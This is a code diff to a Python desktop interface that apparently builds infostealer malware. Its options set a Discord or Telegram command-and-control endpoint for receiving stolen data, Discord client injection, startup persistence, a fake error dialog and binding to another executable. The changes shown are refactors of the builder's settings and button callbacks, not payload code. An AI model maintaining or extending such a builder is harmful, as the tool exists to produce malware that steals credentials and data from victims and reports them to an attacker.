@@ -89,16 +89,18 @@ class Utility:
 				updatesCheck = config.get("Check for updates", updatesCheck)
 		else:
 			updatesCheck = not input("Do you want to regularly check for updates? [Y (default)/N]: ").lower().startswith("n")
-			_password = input("Enter a new password for the archive (default: %r): " % Settings.Password).strip()
-			if _password:
+			if _password := input(
+				"Enter a new password for the archive (default: %r): "
+				% Settings.Password
+			).strip():
 				password = _password
-			
+
 		with open(configFile, "w") as file:
 			json.dump({
 				"Password" : password,
 				"Check for updates" : updatesCheck
 			}, file, indent= 4, sort_keys= True)
-		
+
 		Settings.Password = password
 		Settings.UpdatesCheck = updatesCheck
 
@@ -247,8 +249,6 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 	def C2ModeButtonControl_Callback(self) -> None:
 		self.focus() # Removes focus from the C2 text box
 		DISCORD = "C2: Discord"
-		TELEGRAM = "C2: Telegram"
-
 		discordOnlyCheckBoxes = (
 			(self.pingMeCheckboxControl, self.pingMeVar),
 			(self.discordInjectionCheckboxControl, self.discordInjectionVar)
@@ -256,6 +256,8 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 
 		if self.C2Mode == 0: # Change to Telegram
 			self.C2Mode = 1
+			TELEGRAM = "C2: Telegram"
+
 			buttonText = TELEGRAM
 			self.C2EntryControl.configure(placeholder_text= "Enter Telegram Endpoint: [Telegram Bot Token]$[Telegram Chat ID]")
 			self.testC2ButtonControl.configure(text= "Test Endpoint")
@@ -321,9 +323,6 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 			self.selectIconButtonControl.configure(text= SELECT)
 	
 	def buildModeButtonControl_Callback(self) -> None:
-		EXEMODE = "Output: EXE File"
-		PYMODE = "Output:   PY File"
-
 		exeOnlyChecboxControls = (
 			(self.fakeErrorCheckboxControl, self.fakeErrorVar),
 			(self.startupCheckboxControl, self.startupVar),
@@ -335,6 +334,8 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 
 		if self.OutputAsExe: # Change to PY mode
 			self.OutputAsExe = False
+			PYMODE = "Output:   PY File"
+
 			buttonText = PYMODE
 
 			for control, var in exeOnlyChecboxControls:
@@ -342,15 +343,16 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 				if var:
 					var.set(False)
 			self.fakeError_Event()
-			
+
 			if self.iconBytes:
 				self.selectIconButtonControl_Callback() # Remove icon
-			
+
 			if self.boundExePath:
 				self.bindExeButtonControl_Callback() # Remove bound executable
 
 		else: # Change to EXE mode
 			self.OutputAsExe = True
+			EXEMODE = "Output: EXE File"
 			buttonText = EXEMODE
 
 			for control, _ in exeOnlyChecboxControls:
@@ -359,18 +361,18 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 		self.buildModeButtonControl.configure(text= buttonText)
 	
 	def consoleModeButtonControl_Callback(self) -> None:
-		CONSOLE_NONE = "Console: None"
-		CONSOLE_FORCE = "Console: Force"
 		CONSOLE_DEBUG = "Console: Debug"
 
 		if self.ConsoleMode == 0:
 			self.ConsoleMode = 1
+			CONSOLE_FORCE = "Console: Force"
 			buttonText = CONSOLE_FORCE
 		elif self.ConsoleMode == 1:
 			self.ConsoleMode = 2
 			buttonText = CONSOLE_DEBUG
 		else:
 			self.ConsoleMode = 0
+			CONSOLE_NONE = "Console: None"
 			buttonText = CONSOLE_NONE
 
 		self.consoleModeButtonControl.configure(text= buttonText)
